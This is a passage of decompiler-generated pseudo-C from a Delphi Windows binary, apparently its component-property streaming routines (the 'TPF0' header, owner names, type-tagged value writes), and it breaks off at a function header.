OLECHAR **__usercall sub_41EA9C@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4)
{
  unsigned int v5[2]; // [esp-Ch] [ebp-10h] BYREF
  int *v6; // [esp-4h] [ebp-8h]
  OLECHAR *v7; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v7 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_41EAFC;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_4169D4(*(_DWORD **)(a4 - 16), *(_DWORD *)(a4 - 8), (int *)&v7);
  if ( !(unsigned __int8)sub_41EA14(a1, (int)&savedregs) )
  {
    sub_41E5B0(a4);
    sub_41F9F0(*(_DWORD **)(a4 - 4), (__int16 *)v7, a1, a2, a3);
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_41EB03;
  return sub_404900(&v7);
}

//----- (0041EB08) --------------------------------------------------------
int __usercall sub_41EB08@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  LOBYTE(a3) = 1;
  if ( !a1 )
    return 0;
  while ( a2 != a1 )
  {
    a1 = *(_DWORD *)(a1 + 4);
    if ( !a1 )
      return 0;
  }
  return a3;
}

//----- (0041EB20) --------------------------------------------------------
_DWORD *__usercall sub_41EB20@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ecx>, int a4)
{
  int v6; // eax
  int v7; // edi
  unsigned int v9[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v10; // [esp-10h] [ebp-14h]
  int v11; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v11 = 0;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_41EC0F;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v6 = *(_DWORD *)(*(_DWORD *)(a4 - 4) + 28);
  if ( v6 == *(_DWORD *)(a1 + 4) )
  {
    sub_4042C0(a2, *(_DWORD *)(a1 + 8));
  }
  else if ( v6 == a1 )
  {
    sub_4042C0(a2, (__int32)"Owner");
  }
  else
  {
    v7 = *(_DWORD *)(a1 + 4);
    if ( v7 && *(_DWORD *)(v7 + 8) && *(_DWORD *)(a1 + 8) )
    {
      if ( (unsigned __int8)sub_41EB08(*(_DWORD *)(a1 + 4), *(_DWORD *)(*(_DWORD *)(a4 - 4) + 28), a3) )
        sub_41EB20(a4);
      sub_4045E4(a2, 3);
    }
    else if ( *(_DWORD *)(a1 + 8) )
    {
      sub_404570(a2, *(char **)(a1 + 8), ".Owner");
    }
    else
    {
      sub_40426C(a2);
    }
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_41EC16;
  return sub_40426C(&v11);
}

//----- (0041EC48) --------------------------------------------------------
bool __usercall sub_41EC48@<al>(int a1@<eax>, int a2@<edx>, int a3)
{
  return a1
      && *(_DWORD *)(*(_DWORD *)(a3 - 4) + 40) == *(_DWORD *)(a1 + 4)
      && a2
      && *(_DWORD *)(*(_DWORD *)(a3 - 4) + 24) == *(_DWORD *)(a2 + 4)
      && sub_407ACC(*(_BYTE **)(a1 + 8), *(_BYTE **)(a2 + 8));
}

//----- (0041EC90) --------------------------------------------------------
bool __cdecl sub_41EC90(int a1)
{
  int v1; // ebx
  int v2; // eax

  v1 = 0;
  if ( sub_41E568(*(_DWORD *)(a1 + 8)) )
  {
    LOBYTE(v2) = sub_416660(
                   *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(a1 + 8) - 4) + 32),
                   *(_DWORD *)(*(_DWORD *)(a1 + 8) - 8));
    v1 = v2;
    if ( sub_41EC48(v2, *(_DWORD *)(a1 - 4), *(_DWORD *)(a1 + 8)) )
      v1 = *(_DWORD *)(a1 - 4);
  }
  return v1 == *(_DWORD *)(a1 - 4);
}
// 41ECC1: variable 'v2' is possibly undefined

//----- (0041ECF0) --------------------------------------------------------
int __cdecl sub_41ECF0(int a1)
{
  int *v1; // eax
  bool v2; // al
  __int32 v3; // ecx
  int v4; // eax
  int v5; // eax
  _DWORD v7[2]; // [esp-18h] [ebp-2Ch] BYREF
  void (__stdcall **v8)(int *); // [esp-10h] [ebp-24h]
  unsigned int v9[2]; // [esp-Ch] [ebp-20h] BYREF
  void **v10; // [esp-4h] [ebp-18h]
  char *v11; // [esp+0h] [ebp-14h] BYREF
  char *v12; // [esp+4h] [ebp-10h] BYREF
  __int32 v13; // [esp+8h] [ebp-Ch] BYREF
  unsigned int v14; // [esp+Ch] [ebp-8h]
  int *v15; // [esp+10h] [ebp-4h]
  void *savedregs; // [esp+14h] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v13 = 0;
  v12 = 0;
  v11 = 0;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_41EF08;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  LOBYTE(v1) = sub_416660(*(_DWORD **)(a1 - 16), *(_DWORD *)(a1 - 8));
  v15 = v1;
  if ( v1 || sub_41EC90((int)&savedregs) )
  {
    if ( sub_4036C0(v15, (int)off_4176E0) )
    {
      if ( !sub_4036C0(v15, (int)off_418058) || (v15[9] & 4) != 0 )
      {
        v14 = *(_DWORD *)(*(_DWORD *)(a1 - 4) + 32);
        sub_404304(&v13, *(_DWORD *)(*(_DWORD *)(a1 - 4) + 44));
        v8 = (void (__stdcall **)(int *))&savedregs;
        v7[1] = &loc_41EE84;
        v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v7);
        sub_4044C8(&v11, (char *)(*(_DWORD *)(a1 - 8) + 26));
        sub_4045E4((volatile __int32 *)(*(_DWORD *)(a1 - 4) + 44), 3);
        v2 = sub_41E568(a1);
        v3 = v13;
        if ( v2 )
        {
          LOBYTE(v4) = sub_416660(*(_DWORD **)(*(_DWORD *)(a1 - 4) + 32), *(_DWORD *)(a1 - 8));
          *(_DWORD *)(*(_DWORD *)(a1 - 4) + 32) = v4;
        }
        sub_41E4A0(v3, v15);
        __writefsdword(0, v14);
        savedregs = &loc_41EE8B;
        *(_DWORD *)(*(_DWORD *)(a1 - 4) + 32) = v14;
        sub_4042C0((volatile __int32 *)(*(_DWORD *)(a1 - 4) + 44), v13);
        if ( sub_4036C0(v15, (int)off_417884) )
        {
          if ( !sub_41E568(a1)
            || (v8 = *(void (__stdcall ***)(int *))(*(_DWORD *)(a1 - 4) + 40),
                LOBYTE(v5) = sub_416660(*(_DWORD **)(*(_DWORD *)(a1 - 4) + 32), *(_DWORD *)(a1 - 8)),
                !sub_418A00((int)v15, v5, *(void (__stdcall ***)(int *))(*(_DWORD *)(a1 - 4) + 28), v8)) )
          {
            sub_41E704((int)v15, a1);
          }
        }
      }
      else if ( !sub_41EC90((int)&savedregs) )
      {
        sub_41EB20((int)v15, (volatile __int32 *)&v12, (int)v8, a1);
        if ( v12 )
        {
          sub_41E5B0(a1);
          sub_41E2BC(*(_DWORD **)(a1 - 4), v12);
        }
      }
    }
  }
  else
  {
    sub_41E5B0(a1);
    sub_41FAA4(*(_DWORD **)(a1 - 4), 13, (int)v8);
  }
  __writefsdword(0, v9[0]);
  v10 = (void **)&loc_41EF0F;
  return sub_404290((int)&v11, 3);
}
// 41ED19: variable 'v1' is possibly undefined
// 41EE48: variable 'v4' is possibly undefined
// 41EE54: variable 'v3' is possibly undefined
// 41EED7: variable 'v5' is possibly undefined
// 4176E0: using guessed type int (*off_4176E0[3])();
// 417884: using guessed type int (*off_417884[10])();
// 418058: using guessed type int (*off_418058[7])();
// 41E4A0: using guessed type int __fastcall sub_41E4A0(_DWORD, _DWORD);

//----- (0041EF20) --------------------------------------------------------
int __usercall sub_41EF20@<eax>(int a1@<ebx>, int a2)
{
  int (__stdcall ***v2)(_DWORD, int, int); // eax
  _DWORD *v3; // eax
  int v4; // eax
  int v5; // eax
  int v7; // [esp-14h] [ebp-1Ch]
  unsigned int v8[2]; // [esp-10h] [ebp-18h] BYREF
  int *v9; // [esp-8h] [ebp-10h]
  int v10; // [esp+0h] [ebp-8h] BYREF
  int (__stdcall ***v11)(_DWORD, int, int); // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_41EFD4;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  LOBYTE(a1) = *(_DWORD *)(a2 - 4) == 0;
  if ( sub_41E568(*(_DWORD *)(a2 + 8)) )
  {
    sub_417010(*(_DWORD **)(*(_DWORD *)(*(_DWORD *)(a2 + 8) - 4) + 32), *(_DWORD *)(*(_DWORD *)(a2 + 8) - 8), &v11);
    v2 = *(int (__stdcall ****)(_DWORD, int, int))(a2 - 4);
    LOBYTE(a1) = v2 == v11;
    if ( v2 != v11 )
    {
      v3 = sub_405F40(&v10);
      if ( sub_40AD5C(v11, (int)dword_41EFE4, (int)v3) )
      {
        v7 = *(_DWORD *)(a2 + 8);
        v4 = (*(int (**)(void))(*(_DWORD *)v10 + 12))();
        LOBYTE(v5) = sub_41EC48(v4, *(_DWORD *)(a2 - 8), v7);
        a1 = v5;
      }
    }
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_41EFDB;
  sub_405F40(&v10);
  sub_405F40(&v11);
  return a1;
}
// 41EFB4: variable 'v5' is possibly undefined
// 41EFE4: using guessed type int dword_41EFE4[4];

//----- (0041EFF4) --------------------------------------------------------
_DWORD *__usercall sub_41EFF4@<eax>(int a1@<ebx>, int a2)
{
  _DWORD *v2; // eax
  int v4; // [esp-10h] [ebp-24h]
  int v5; // [esp-10h] [ebp-24h]
  unsigned int v6[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v7; // [esp-4h] [ebp-18h]
  int v8; // [esp+0h] [ebp-14h] BYREF
  char *v9; // [esp+4h] [ebp-10h] BYREF
  int v10; // [esp+8h] [ebp-Ch] BYREF
  int v11; // [esp+Ch] [ebp-8h]
  int (__stdcall ***v12)(_DWORD, int, int); // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9 = 0;
  v8 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_41F0F7;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_417010(*(_DWORD **)(a2 - 16), *(_DWORD *)(a2 - 8), &v12);
  if ( v12 && (v2 = sub_405F40(&v10), sub_40AD5C(v12, (int)dword_41F104, (int)v2)) )
  {
    v11 = (*(int (**)(void))(*(_DWORD *)v10 + 12))();
    if ( !(unsigned __int8)sub_41EF20(a1, (int)&savedregs) )
    {
      sub_41EB20(v11, (volatile __int32 *)&v9, v5, a2);
      if ( v9 )
      {
        sub_41E5B0(a2);
        sub_41E2BC(*(_DWORD **)(a2 - 4), v9);
      }
    }
  }
  else if ( sub_41E568(a2) )
  {
    sub_417010(*(_DWORD **)(*(_DWORD *)(a2 - 4) + 32), *(_DWORD *)(a2 - 8), &v8);
    if ( v8 )
    {
      sub_41E5B0(a2);
      sub_41FAA4(*(_DWORD **)(a2 - 4), 13, v4);
    }
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_41F0FE;
  sub_405F40(&v8);
  sub_40426C(&v9);
  sub_405F40(&v10);
  return sub_405F40(&v12);
}
// 41F07E: variable 'v4' is possibly undefined
// 41F0A5: variable 'v5' is possibly undefined
// 41F104: using guessed type int dword_41F104[4];

//----- (0041F114) --------------------------------------------------------
bool __cdecl sub_41F114(int a1)
{
  int v1; // ebx
  bool result; // al
  char v3[256]; // [esp+8h] [ebp-108h] BYREF
  int v4; // [esp+108h] [ebp-8h] BYREF

  v1 = 0;
  if ( sub_41E568(*(_DWORD *)(a1 + 8)) )
  {
    sub_416F34(*(_DWORD **)(*(_DWORD *)(*(_DWORD *)(a1 + 8) - 4) + 32), *(_DWORD *)(*(_DWORD *)(a1 + 8) - 8), &v4);
    v1 = v4;
  }
  result = 1;
  if ( v1 != *(_DWORD *)(a1 - 8) )
  {
    if ( !*(_DWORD *)(a1 - 8) )
      return 0;
    sub_4037D4(**(_DWORD ***)(*(_DWORD *)(*(_DWORD *)(a1 + 8) - 4) + 28), *(_DWORD *)(a1 - 8), v3);
    if ( v3[0] )
      return 0;
  }
  return result;
}
// 41F114: using guessed type char var_108[256];

//----- (0041F198) --------------------------------------------------------
_DWORD *__cdecl sub_41F198(int a1)
{
  int v2; // [esp-10h] [ebp-120h]
  unsigned int v3[2]; // [esp-Ch] [ebp-11Ch] BYREF
  int *v4; // [esp-4h] [ebp-114h]
  char v5[256]; // [esp+4h] [ebp-10Ch] BYREF
  char *v6; // [esp+104h] [ebp-Ch] BYREF
  int v7; // [esp+108h] [ebp-8h] BYREF
  int savedregs; // [esp+110h] [ebp+0h] BYREF

  v6 = 0;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_41F23E;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_416F34(*(_DWORD **)(a1 - 16), *(_DWORD *)(a1 - 8), &v7);
  if ( !sub_41F114((int)&savedregs) )
  {
    sub_41E5B0(a1);
    if ( v7 )
    {
      sub_4037D4(**(_DWORD ***)(*(_DWORD *)(a1 - 4) + 28), v7, v5);
      sub_4044C8(&v6, v5);
      sub_41E2BC(*(_DWORD **)(a1 - 4), v6);
    }
    else
    {
      sub_41FAA4(*(_DWORD **)(a1 - 4), 13, v2);
    }
  }
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_41F245;
  return sub_40426C(&v6);
}
// 41F1ED: variable 'v2' is possibly undefined

//----- (0041F24C) --------------------------------------------------------
int __usercall sub_41F24C@<eax>(int a1@<ebx>, int a2)
{
  int v2; // eax
  int v3; // ebx
  int v5; // [esp-14h] [ebp-24h]
  unsigned int v6[2]; // [esp-10h] [ebp-20h] BYREF
  int *v7; // [esp-8h] [ebp-18h]
  int v8; // [esp-4h] [ebp-14h]
  _WORD v9[8]; // [esp+0h] [ebp-10h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  memset(v9, 0, sizeof(v9));
  v8 = a1;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_41F2C7;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( sub_41E568(*(_DWORD *)(a2 + 8)) )
  {
    sub_416EB4(*(_DWORD **)(*(_DWORD *)(*(_DWORD *)(a2 + 8) - 4) + 32), *(_DWORD *)(*(_DWORD *)(a2 + 8) - 8), (int)v9);
    LOBYTE(v2) = sub_414E3C((__int16 *)(a2 - 16), v9);
    v3 = v2;
  }
  else
  {
    v3 = sub_414DAC((__int16 *)(a2 - 16), v5);
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_41F2CE;
  sub_405160();
  return v3;
}
// 41F24C: could not find valid save-restore pair for ebx
// 41F2A0: variable 'v2' is possibly undefined
// 41F2AA: variable 'v5' is possibly undefined
// 41F24C: using guessed type _WORD var_10[8];

//----- (0041F2D8) --------------------------------------------------------
unsigned __int16 *__usercall sub_41F2D8@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4)
{
  unsigned __int16 *result; // eax
  unsigned int v5[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v6; // [esp-4h] [ebp-14h]
  unsigned __int16 v7[8]; // [esp+0h] [ebp-10h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  memset(v7, 0, sizeof(v7));
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_41F33C;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_416EB4(*(_DWORD **)(a4 - 16), *(_DWORD *)(a4 - 8), (int)v7);
  if ( !(unsigned __int8)sub_41F24C(a1, (int)&savedregs) )
  {
    sub_41E5B0(a4);
    sub_41F460(*(_DWORD **)(a4 - 4), v7, a2, a3);
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_41F343;
  result = v7;
  sub_405160();
  return result;
}
// 41F333: returning address of temporary local variable '%var_10'
// 41F2D8: using guessed type unsigned __int16 var_10[8];

//----- (0041F348) --------------------------------------------------------
char __usercall sub_41F348@<al>(_DWORD *a1@<edx>, _DWORD **a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  _BYTE *v5; // eax
  int *v6; // eax
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  LOBYTE(v5) = (_BYTE)a2;
  if ( a2[1] )
  {
    if ( a2[2]
      || (v5 = (_BYTE *)**a2, *v5 == 7)
      && (LOBYTE(v6) = sub_416660(a1, (int)a2), LOBYTE(v5) = sub_4036C0(v6, (int)off_418058), (_BYTE)v5)
      && (LOBYTE(v5) = sub_416660(a1, (int)a2), (v5[36] & 4) != 0) )
    {
      LOBYTE(v5) = *(_BYTE *)**a2;
      switch ( (char)v5 )
      {
        case 1:
        case 2:
        case 3:
        case 6:
          LOBYTE(v5) = (unsigned __int8)sub_41E804((int)&savedregs);
          break;
        case 4:
          LOBYTE(v5) = sub_41E930((int)&savedregs);
          break;
        case 5:
        case 10:
        case 11:
          LOBYTE(v5) = (unsigned __int8)sub_41EA9C(a3, a4, a5, (int)&savedregs);
          break;
        case 7:
          LOBYTE(v5) = sub_41ECF0((int)&savedregs);
          break;
        case 8:
          LOBYTE(v5) = (unsigned __int8)sub_41F198((int)&savedregs);
          break;
        case 12:
          LOBYTE(v5) = (unsigned __int8)sub_41F2D8(a3, a4, a5, (int)&savedregs);
          break;
        case 15:
          LOBYTE(v5) = (unsigned __int8)sub_41EFF4(a3, (int)&savedregs);
          break;
        case 16:
          LOBYTE(v5) = sub_41E9CC((int)&savedregs);
          break;
        default:
          return (char)v5;
      }
    }
  }
  return (char)v5;
}
// 41F38E: variable 'v6' is possibly undefined
// 41F3A6: variable 'v5' is possibly undefined
// 418058: using guessed type int (*off_418058[7])();

//----- (0041F460) --------------------------------------------------------
_DWORD *__usercall sub_41F460@<eax>(_DWORD *a1@<eax>, unsigned __int16 *a2@<edx>, int a3@<edi>, int a4@<esi>)
{
  _DWORD *v5; // eax
  int v6; // eax
  int v7; // ecx
  int v8; // eax
  unsigned int v9; // eax
  bool v10; // cf
  unsigned int v11; // eax
  unsigned int v12; // eax
  int v13; // eax
  int v14; // ecx
  int v15; // ecx
  int v16; // ecx
  double v17; // st7
  int v18; // ecx
  int v19; // ecx
  int v20; // ecx
  int v21; // ecx
  int v22; // ecx
  int v23; // ecx
  _DWORD v25[3]; // [esp-18h] [ebp-178h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v26; // [esp-Ch] [ebp-16Ch] BYREF
  void *v27; // [esp-8h] [ebp-168h]
  int *v28; // [esp-4h] [ebp-164h]
  _BYTE v29[12]; // [esp+0h] [ebp-160h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+Ch] [ebp-154h] BYREF
  void *v31; // [esp+10h] [ebp-150h]
  int *v32; // [esp+14h] [ebp-14Ch]
  void *v33; // [esp+18h] [ebp-148h]
  int v34; // [esp+1Ch] [ebp-144h]
  int v35; // [esp+20h] [ebp-140h]
  char v36[256]; // [esp+24h] [ebp-13Ch] BYREF
  char *v37; // [esp+124h] [ebp-3Ch] BYREF
  CHAR *v38; // [esp+128h] [ebp-38h]
  int (__stdcall ***v39)(_DWORD, int, int); // [esp+12Ch] [ebp-34h] BYREF
  CHAR *v40; // [esp+130h] [ebp-30h] BYREF
  OLECHAR *v41; // [esp+134h] [ebp-2Ch] BYREF
  __int64 v42; // [esp+138h] [ebp-28h]
  int v43; // [esp+144h] [ebp-1Ch] BYREF
  unsigned int v44; // [esp+148h] [ebp-18h] BYREF
  _DWORD *v45; // [esp+14Ch] [ebp-14h]
  _DWORD *v46; // [esp+150h] [ebp-10h]
  _DWORD *v47; // [esp+154h] [ebp-Ch]
  int *v48; // [esp+158h] [ebp-8h] BYREF
  _DWORD *v49; // [esp+15Ch] [ebp-4h]
  int savedregs; // [esp+160h] [ebp+0h] BYREF

  v37 = 0;
  v38 = 0;
  v39 = 0;
  v40 = 0;
  v41 = 0;
  v43 = 0;
  v49 = a1;
  v32 = &savedregs;
  v31 = &loc_41F839;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( sub_4150FC(a2, (int)a2) )
  {
    v5 = sub_409624((int)dword_4173A0, 1, off_42B964[0]);
    sub_403CCC((int)v5, (int)ExceptionList, (int)v31, (int)v32, (int)v33);
  }
  v6 = sub_414DA8((int)a2) & 0xFFF;
  if ( v6 > 7 )
  {
    if ( v6 >= 16 )
    {
      v9 = v6 - 16;
      v10 = v9 < 3;
      v11 = v9 - 3;
      if ( v10 )
      {
LABEL_18:
        v13 = sub_4050B8();
        sub_41E380(v49, v13, v14);
        goto LABEL_32;
      }
      v10 = v11 < 2;
      v12 = v11 - 2;
      if ( v10 )
      {
        v42 = sub_4050C0();
        sub_41E3F4(v49, v21, v42);
        goto LABEL_32;
      }
      if ( v12 == 235 )
      {
        sub_4050E0(v7, a2);
        sub_41F99C(v49, v40);
        goto LABEL_32;
      }
    }
    else
    {
      v8 = v6 - 8;
      if ( !v8 )
      {
        sub_4050E8(ExceptionList, v31, v32, v33, v34, v35);
        sub_41F9F0(v49, (__int16 *)v41, (int)a2, a3, a4);
        goto LABEL_32;
      }
      if ( v8 == 3 )
      {
        if ( (unsigned __int8)sub_4050C8() )
          sub_41FAA4(v49, 9, v20);
        else
          sub_41FAA4(v49, 8, v20);
        goto LABEL_32;
      }
    }
LABEL_27:
    *(_DWORD *)&v29[8] = &savedregs;
    *(_DWORD *)&v29[4] = &loc_41F7DD;
    *(_DWORD *)v29 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v29);
    if ( sub_415EA4(*a2, &v48) && (v28 = sub_405F40(&v43), sub_4050F0(), sub_40AD5C(v39, (int)dword_41F848, (int)v28)) )
    {
      v47 = sub_403504(&off_417DB0, 1);
      v46 = sub_403504(&off_417DB0, 1);
      v28 = &savedregs;
      v27 = &loc_41F7CC;
      v26 = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&v26);
      v45 = sub_41B2D8((int)&off_417F20, 1, (int)v47, 1024);
      v25[2] = &savedregs;
      v25[1] = &loc_41F771;
      v25[0] = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v25);
      (*(void (__fastcall **)(_DWORD *, unsigned __int16 *, _DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, _DWORD, _DWORD, _DWORD, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v43 + 16))(
        v46,
        a2,
        v25[0],
        &loc_41F771,
        &savedregs,
        v26,
        v27,
        v28,
        *(_DWORD *)v29,
        *(_DWORD *)&v29[4],
        *(_DWORD *)&v29[8],
        ExceptionList);
      v44 = sub_41AAD4((int)v46);
      sub_403484(*v48, v36);
      sub_4044C8(&v37, v36);
      sub_41F99C(v45, v37);
      sub_41DAFC(v45, (char *)&v44, 4u);
      sub_41DAFC(v45, (char *)v46[1], v44);
      __writefsdword(0, (unsigned int)v31);
      v33 = &loc_41F778;
      sub_403534(v45);
      v44 = sub_41AAD4((int)v47);
      sub_41FAA4(v49, 10, v23);
      sub_41DAFC(v49, (char *)&v44, 4u);
      sub_41DAFC(v49, (char *)v47[1], v44);
      __writefsdword(0, (unsigned int)v31);
      v33 = &loc_41F7D3;
      sub_403534(v46);
      sub_403534(v47);
    }
    else
    {
      sub_4050E0(v22, a2);
      sub_41F99C(v49, v38);
    }
    __writefsdword(0, *(unsigned int *)v29);
  }
  else if ( v6 == 7 )
  {
    *(double *)&v29[4] = sub_4050D0();
    sub_41E298(v49, v19, v29[4], *(int *)&v29[8]);
  }
  else
  {
    switch ( v6 )
    {
      case 0:
        sub_41FAA4(v49, 13, v7);
        break;
      case 1:
        sub_41FAA4(v49, 0, v7);
        break;
      case 2:
      case 3:
        goto LABEL_18;
      case 4:
        *(float *)&v29[8] = sub_4050D0();
        sub_41E250(v49, v15, v29[8]);
        break;
      case 5:
        *(double *)v29 = sub_4050D0();
        sub_41E22C(v49, v16, v29[0], *(int *)&v29[4], *(int *)&v29[8]);
        break;
      case 6:
        v17 = sub_4050D8();
        sub_41E274(v49, v18, (__int64)v17, (unsigned __int64)(__int64)v17 >> 32);
        break;
      default:
        goto LABEL_27;
    }
  }
LABEL_32:
  __writefsdword(0, (unsigned int)ExceptionList);
  v32 = (int *)&loc_41F840;
  sub_404290((int)&v37, 2);
  sub_405F40(&v39);
  sub_40426C(&v40);
  sub_404900(&v41);
  return sub_405F40(&v43);
}
// 41F534: variable 'v7' is possibly undefined
// 41F58D: variable 'v14' is possibly undefined
// 41F5A8: variable 'v15' is possibly undefined
// 41F5C3: variable 'v16' is possibly undefined
// 41F5DE: variable 'v18' is possibly undefined
// 41F5F9: variable 'v19' is possibly undefined
// 41F613: variable 'v20' is possibly undefined
// 41F642: variable 'v21' is possibly undefined
// 41F693: variable 'v22' is possibly undefined
// 41F788: variable 'v23' is possibly undefined
// 4050B8: using guessed type int sub_4050B8(void);
// 4050C0: using guessed type __int64 sub_4050C0(void);
// 4050C8: using guessed type int sub_4050C8(void);
// 4050D0: using guessed type double sub_4050D0(void);
// 4050D8: using guessed type double sub_4050D8(void);
// 4050E0: using guessed type int __fastcall sub_4050E0(_DWORD, _DWORD);
// 4050E8: using guessed type int __stdcall sub_4050E8(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4050F0: using guessed type int sub_4050F0(void);
// 4173A0: using guessed type int dword_4173A0[3];
// 417DB0: using guessed type int (*off_417DB0)();
// 417F20: using guessed type int (*off_417F20)();
// 41F848: using guessed type int dword_41F848[4];
// 42B964: using guessed type int **off_42B964[2];

//----- (0041F858) --------------------------------------------------------
_DWORD *__usercall sub_41F858@<eax>(int a1@<eax>, char *a2@<edx>)
{
  unsigned int v4[2]; // [esp-14h] [ebp-18h] BYREF
  int *v5; // [esp-Ch] [ebp-10h]
  char *v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_41F89E;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_404570((volatile __int32 *)&v6, *(char **)(a1 + 44), a2);
  sub_41F8BC((_DWORD *)a1, v6);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_41F8A5;
  return sub_40426C(&v6);
}

//----- (0041F8AC) --------------------------------------------------------
_DWORD *__usercall sub_41F8AC@<eax>(_DWORD *a1@<eax>)
{
  return sub_41DAFC(a1, aTpf0, 4u);
}

//----- (0041F8BC) --------------------------------------------------------
_DWORD *__usercall sub_41F8BC@<eax>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  char *v4; // eax
  unsigned int v6[3]; // [esp+0h] [ebp-Ch] BYREF

  v6[0] = sub_404524((int)a2);
  if ( (int)v6[0] > 255 )
    v6[0] = 255;
  sub_41DAFC(a1, (char *)v6, 1u);
  v4 = sub_40471C(a2);
  return sub_41DAFC(a1, v4, v6[0]);
}
// 41F8BC: using guessed type unsigned int var_C[3];

//----- (0041F904) --------------------------------------------------------
_DWORD *__usercall sub_41F904@<eax>(_DWORD *a1@<eax>, char *a2@<edx>, int *a3@<ecx>)
{
  char v6; // zf
  int v7; // ecx
  int v9; // ecx
  unsigned int v10[4]; // [esp+0h] [ebp-10h] BYREF

  v10[0] = (unsigned int)a3;
  Delphi_CompareCall_404668((int)a2, a3);
  if ( v6 )
  {
    v10[0] = sub_404524((int)a2);
    if ( (int)v10[0] > 255 )
    {
      sub_41FAA4(a1, 12, v9);
      sub_41DAFC(a1, (char *)v10, 4u);
    }
    else
    {
      sub_41FAA4(a1, 6, v9);
      sub_41DAFC(a1, (char *)v10, 1u);
    }
    return sub_41DAFC(a1, a2, v10[0]);
  }
  else
  {
    v10[0] = sub_404524((int)a3);
    sub_41FAA4(a1, 20, v7);
    sub_41DAFC(a1, (char *)v10, 4u);
    return sub_41DAFC(a1, (char *)a3, v10[0]);
  }
}
// 41F917: variable 'v6' is possibly undefined
// 41F927: variable 'v7' is possibly undefined
// 41F95F: variable 'v9' is possibly undefined

//----- (0041F99C) --------------------------------------------------------
_DWORD *__usercall sub_41F99C@<eax>(_DWORD *a1@<eax>, CHAR *a2@<edx>)
{
  unsigned int v5[2]; // [esp-14h] [ebp-18h] BYREF
  int *v6; // [esp-Ch] [ebp-10h]
  int *v7; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v7 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_41F9E1;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_406384(a2, (volatile __int32 *)&v7);
  sub_41F904(a1, a2, v7);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_41F9E8;
  return sub_40426C(&v7);
}

//----- (0041F9F0) --------------------------------------------------------
